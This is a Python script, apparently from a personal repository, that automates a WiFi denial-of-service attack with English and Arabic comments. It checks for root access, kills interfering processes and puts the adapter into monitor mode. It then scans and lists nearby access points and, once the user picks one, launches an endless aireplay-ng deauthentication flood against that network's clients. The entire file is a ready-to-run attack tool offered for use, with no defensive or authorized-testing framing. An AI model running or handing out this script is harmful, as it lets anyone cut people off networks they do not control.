# DDOS_ATTACK
DoS_attack_on_WiFi

#!/usr/bin/env python3
#DoS attack on WIFIY
#HATEM ATWA ROSOTM


# We will be using the subprocess module to run commands on Kali Linux.
import subprocess
# We require regular expressions.
import re
# We want to open the CSV files generated by airmon-ng,
# and we'll use the built-in csv module.
import csv
# We want to import os because we want to check for sudo
import os
# We want to use time.sleep()
import time
# We want to move .csv files in the folder if we found any.
# We'll use shutil for that.
import shutil
# Create a timestamp for .csv filename
from datetime import datetime

# Create an empty list
active_wireless_networks = []

# We use this function to test if the ESSID is already in the list file.
# نستخدم هذه الوظيفة لاختبار ما إذا كان ESSID موجودًا بالفعل في ملف القائمة.
# If so we return False so we don't add it again.
# إذا كان الأمر كذلك ، فإننا نعيد False حتى لا نضيفها مرة أخرى.
# If it is not in the lst we return True which will instruct the elif
# statement to add it to the lst.
#إذا لم يكن في lst سنعود True الذي سيوجه elif
# بيان لإضافته إلى lst.
def check_for_essid(essid, lst):
    check_status = True

    # If no ESSIDs in list add the row
    # في حالة عدم وجود معرّفات ESSID في القائمة ، أضف الصف
    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    # لن يتم تشغيل هذا إلا إذا كانت هناك نقاط وصول لاسلكية في القائمة.
    for item in lst:
        # If True don't add to list. False will add it to list
        # إذا كان هذا صحيحًا ، فلا تضفه إلى القائمة. خطأ سيضيفه إلى القائمة
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Basic user interface header
# رأس واجهة المستخدم الأساسية
print(r"""h͠a͠t͠e͠m͠""")
print("\n****************************************************************")
print("\n* Copyright of HATEM ROSTOM, 2023                              *")
print("\n* https://HATEMATW99@GMAIL.COM.com                             *")
print("\n* https://www.tiktok.com/@h.a.k.e.r_404?_t=8cBRnChHqeP&_r=1    *")
print("\n* https://instagram.com/hatem_at_rus?igshid=ZGUzMzM3NWJiOQ==   *")


# If the user doesn't run the program with super user privileges, don't allow them to continue.
# إذا لم يقم المستخدم بتشغيل البرنامج بامتيازات المستخدم المتميز ، فلا تسمح له بالمتابعة.
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

# Remove .csv files before running the script.
# إزالة ملفات .csv قبل تشغيل البرنامج النصي.
for file_name in os.listdir():
    # We should only have one csv file as we delete them from the folder
    # يجب أن يكون لدينا ملف csv واحد فقط لأننا نحذفه من المجلد
    #  every time we run the program.
    # في كل مرة نقوم بتشغيل البرنامج.
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        # We get the current working directory.
        # نحصل على دليل العمل الحالي.
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            # نقوم بعمل دليل جديد يسمى / backup
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        # Create a timestamp
        # إنشاء طابع زمني
        timestamp = datetime.now()
        # We move any .csv files in the folder to the backup folder.
        # نقوم بنقل أي ملفات .csv في المجلد إلى مجلد النسخ الاحتياطي.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex to find wireless interfaces. We're making the assumption they will all be wlan0 or higher.
# Regex للعثور على واجهات لاسلكية. نحن نفترض أنهم جميعًا سيكونون wlan0 أو أعلى.
wlan_pattern = re.compile("^wlan[0-9]+")

# Python allows is to run system commands by using a function provided by the subprocess module.
# يسمح Python بتشغيل أوامر النظام باستخدام وظيفة توفرها وحدة العملية الفرعية.
# subprocess.run(<list of command line arguments goes here>)
# subprocess.run (<قائمة وسيطات سطر الأوامر تظهر هنا>)
# The script is the parent process and creates a child process which runs the system command,
# البرنامج النصي هو العملية الأم وينشئ عملية فرعية تقوم بتشغيل أمر النظام ،
# and will only continue once the child process has completed.
# وسيستمر فقط بمجرد اكتمال العملية الفرعية.
# We run the iwconfig command to look for wireless interfaces.
# نقوم بتشغيل الأمر iwconfig للبحث عن واجهات لاسلكية.
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No WiFi Adapter connected.
# لا يوجد محول WiFi متصل.
if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

# Menu to select WiFi interface from
# قائمة لتحديد واجهة WiFi منها
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
# تأكد من صلاحية واجهة WiFi المحددة. قائمة بسيطة مع واجهات للاختيار من بينها.
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

# For easy reference we call the selected interface hacknic
# لسهولة الرجوع إليها نسمي الواجهة المختارة hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Tell the user we're going to kill the conflicting processes.
# أخبر المستخدم أننا سنقوم بقتل العمليات المتضاربة.
print("WiFi adapter connected!\nNow let's kill conflicting processes:")

# subprocess.run(<list of command line arguments goes here>)
# subprocess.run (<قائمة وسيطات سطر الأوامر تظهر هنا>)
# The script is the parent process and creates a child process which runs the system command,
# البرنامج النصي هو العملية الأم وينشئ عملية فرعية تقوم بتشغيل أمر النظام ،
# and will only continue once the child process has completed.
# وسيستمر فقط بمجرد اكتمال العملية الفرعية.
# We run the iwconfig command to look for wireless interfaces.
# نقوم بتشغيل الأمر iwconfig للبحث عن واجهات لاسلكية.
# Killing all conflicting processes using airmon-ng
# قتل جميع العمليات المتضاربة باستخدام airmon-ng

kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless in Monitor mode
# ضع اللاسلكي في وضع المراقبة
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen(<list of command line arguments goes here>)
# subprocess.Popen (<قائمة وسيطات سطر الأوامر تظهر هنا>)
# The Popen method opens a pipe from a command.
# طريقة Popen تفتح أنبوبًا من الأمر.
# The output is an open file that can be accessed by other programs.
# الإخراج عبارة عن ملف مفتوح يمكن الوصول إليه بواسطة برامج أخرى.
# We run the iwconfig command to look for wireless interfaces.
# نقوم بتشغيل الأمر iwconfig للبحث عن واجهات لاسلكية.
# Discover access points
# اكتشف نقاط الوصول
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
# حلقة توضح نقاط الوصول اللاسلكية. نستخدم كتلة try except وسنخرج من الحلقة بالضغط على ctrl-c.
try:
    while True:
        # We want to clear the screen before we print the network interfaces.
        # نريد مسح الشاشة قبل أن نطبع واجهات الشبكة.

        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            # We should only have one csv file as we backup all previous csv files from the folder every time we run the program.
            # يجب أن يكون لدينا ملف csv واحد فقط حيث نقوم بعمل نسخة احتياطية لجميع ملفات csv السابقة من المجلد في كل مرة نقوم فيها بتشغيل البرنامج.
            # The following list contains the field names for the csv entries.
            # تحتوي القائمة التالية على أسماء الحقول لإدخالات csv.
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    # This will run multiple times and we need to reset the cursor to the beginning of the file.
                    # سيتم تشغيل هذا عدة مرات ونحتاج إلى إعادة تعيين المؤشر إلى بداية الملف.
                    csv_h.seek(0)
                    # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above.
                    # نستخدم طريقة DictReader ونخبرها بأخذ محتويات csv_h ثم نطبق القاموس بأسماء الحقول التي حددناها أعلاه.
                    # This creates a list of dictionaries with the keys as specified in the fieldnames.
                    # يؤدي هذا إلى إنشاء قائمة من القواميس باستخدام المفاتيح كما هو محدد في أسماء الحقول.
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        # We want to exclude the row with BSSID.
                        # نريد استبعاد الصف باستخدام BSSID.
                        if row["BSSID"] == "BSSID":
                            pass
                        # We are not interested in the client data.
                        # لسنا مهتمين ببيانات العميل.
                        elif row["BSSID"] == "Station MAC":
                            break
                        # Every field where an ESSID is specified will be added to the list.
                        # ستتم إضافة كل حقل يتم فيه تحديد ESSID إلى القائمة.
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # We're using the print statement with an f-string.
            # نحن نستخدم إفادة print مع سلسلة f.
            # F-strings are a more intuitive way to include variables when printing strings,
            # F-strings هي طريقة أكثر سهولة لتضمين المتغيرات عند طباعة السلاسل ،
            # rather than ugly concatenations.
            # بدلاً من التسلسلات القبيحة.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before loading the updated list.
        # نجعل البرنامج النصي في وضع السكون لمدة ثانية واحدة قبل تحميل القائمة المحدثة.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Ensure that the input choice is valid.
# تأكد من أن اختيار الإدخال صحيح.
while True:
    # If you don't make a choice from the options available in the list,
    # إذا لم تقم بالاختيار من بين الخيارات المتاحة في القائمة ،
    # you will be asked to please try again.
    # سيُطلب منك الرجاء المحاولة مرة أخرى.
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# To make it easier to work with and read the code, we assign the results to variables.
# لتسهيل العمل مع الكود وقراءته ، نقوم بتعيين النتائج إلى المتغيرات.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Change to the channel we want to perform the DOS attack on.
# التغيير إلى القناة التي نريد تنفيذ هجوم DOS عليها.
# Monitoring takes place on a different channel and we need to set it to that channel.
# تتم المراقبة على قناة مختلفة ونحتاج إلى ضبطها على تلك القناة.
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Deauthenticate clients using a subprocess.
# إلغاء مصادقة العملاء باستخدام عملية فرعية.
# The script is the parent process and creates a child process which runs the system command,
# البرنامج النصي هو العملية الأم وينشئ عملية فرعية تقوم بتشغيل أمر النظام ،
# and will only continue once the child process has completed.
# وسيستمر فقط بمجرد اكتمال العملية الفرعية.
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

# User will need to use control-c to break the script.
# سيحتاج المستخدم إلى استخدام control-c لكسر البرنامج النصي.
